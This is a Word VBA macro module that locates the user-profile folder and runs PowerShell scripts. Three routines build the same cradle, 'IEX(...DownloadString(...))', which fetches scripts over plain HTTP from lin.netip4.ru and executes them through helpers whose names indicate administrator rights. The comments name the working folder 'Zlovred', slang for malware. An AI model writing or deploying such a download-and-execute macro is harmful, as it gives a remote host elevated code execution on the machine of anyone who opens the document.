Attribute VB_Name = "UserPwshCmd"
'**********************************************************
'* UserPwshCmd.bas Word VBA Module
'* This Module Contains User Subroutines for
'* Making and Running Users' Powershell Commands and Files
'**********************************************************

'**********************************************************
'* GetUserPrifileEnv Word VBA Function
'* This Function will Return a UserProfile Directory
'
' PARAMETERS:   NONE
' RETURNS:      Path for Zlovred Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'                               "" if General Sysytem Error
'
'**********************************************************

Public Function GetUserProfileEnv()

        Dim fso, wsh, envProc, envSys
        Dim strZlFolder ' Zlovred Temprorary Folder
        ' Define ActiveX Objects
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set wsh = CreateObject("WScript.Shell")
        ' Define Process Environment Variable
        Set envProc = wsh.Environment("PROCESS")
        ' Define System Environment Variable
        Set envSys = wsh.Environment
        ' Define UserProfile Folder
        strZlFolder = envProc("UserProfile")
        ' Define and Check Environment Variables
        Dim envVariable
        envVariable = strZlFolder
        If Not fso.FolderExists(envVariable) Then
                envVariable = envProc("TEMP")
                If Not fso.FolderExists(envVariable) Then
                        envVariable = envSys("TMP")
                        If Not fso.FolderExists(envVariable) Then
                                envVariable = ""
                        End If
                End If
        End If
    GetUserProfileEnv = envVariable
End Function

Public Sub RunEchoFromUserProfile()

    ' Declare Variables
    Dim aDir, aFileName, aFile, fso

    aDir = GetUserProfileEnv()
    aFileName = "echo-server.utf8.wsf.ps1"

    ' Declare an Object
    Set fso = CreateObject("Scripting.FileSystemObject")

    ' Set and Check a Full Path Name
    aFile = aDir & "\" & aFileName
    If (fso.FileExists(aFile)) Then
        MsgBox "Success! File " & aFile & " is Present", vbOKOnly Or vbInformation, "System Information"
        PS_Admin_FileExecute_Vis aFile
    Else
        MsgBox "Error! File " & aFile & " is not Found", vbOKOnly Or vbCritical, "System Error"
    End If
End Sub


Public Sub RunEchoFromSite()

    ' Declare Variables
    Dim aHostURL
    Dim aPref, aDomain, aRemoteDir
    Dim aCmd

    aDir = GetUserProfileEnv()
    aFileName = "echo-server.utf8.wsf.ps1"
    
    aPref = "http"
    aDomain = "lin.netip4.ru"
    aPort = "18080"
    aRemoteDir = "/~vagrant/PROGS/LIB-RUN/PS1/"
    aHostURL = aPref & "://" & aDomain & ":" & aPort & aRemoteDir & aFileName

    aCmd = "IEX(" & _
        "(New-Object System.Net.WebClient).DownloadString(" & _
        "'" & aHostURL & "'))"
    
    ' aCmd = "Get-ComputerInfo -Property 'OsName'"
    
    'PS_Admin_Execute_Vis aCmd
    PS_GetOutput_Admin_Vis aCmd, 5000
    
End Sub

Public Sub RunNITAdjustW00()

    ' Declare Variables
    Dim aHostURL
    Dim aPref, aDomain, aRemoteDir
    Dim aCmd

    aDir = GetUserProfileEnv()
    aFileName = "nit.main.windows.adjust.00.ps1"
    
    aPref = "http"
    aDomain = "lin.netip4.ru"
    aPort = "18080"
    aRemoteDir = "/~vagrant/PROGS/LIB-RUN/PS1/"
    aHostURL = aPref & "://" & aDomain & ":" & aPort & aRemoteDir & aFileName

    aCmd = "IEX(" & _
        "(New-Object System.Net.WebClient).DownloadString(" & _
        "'" & aHostURL & "'))"
    
    ' aCmd = "Get-ComputerInfo -Property 'OsName'"
    
    'PS_Admin_Execute_Vis aCmd
    PS_GetOutput_Admin_Vis aCmd, 5000
    
End Sub

Public Sub RunNITAdjustW01()

    ' Declare Variables
    Dim aHostURL
    Dim aPref, aDomain, aRemoteDir
    Dim aCmd

    aDir = GetUserProfileEnv()
    aFileName = "nit.main.windows.adjust.01.ps1"
    
    aPref = "http"
    aDomain = "lin.netip4.ru"
    aPort = "18080"
    aRemoteDir = "/~vagrant/PROGS/LIB-RUN/PS1/"
    aHostURL = aPref & "://" & aDomain & ":" & aPort & aRemoteDir & aFileName

    aCmd = "IEX(" & _
        "(New-Object System.Net.WebClient).DownloadString(" & _
        "'" & aHostURL & "'))"
    
    ' aCmd = "Get-ComputerInfo -Property 'OsName'"
    
    'PS_Admin_Execute_Vis aCmd
    PS_GetOutput_Admin_Vis aCmd, 5000
    
End Sub

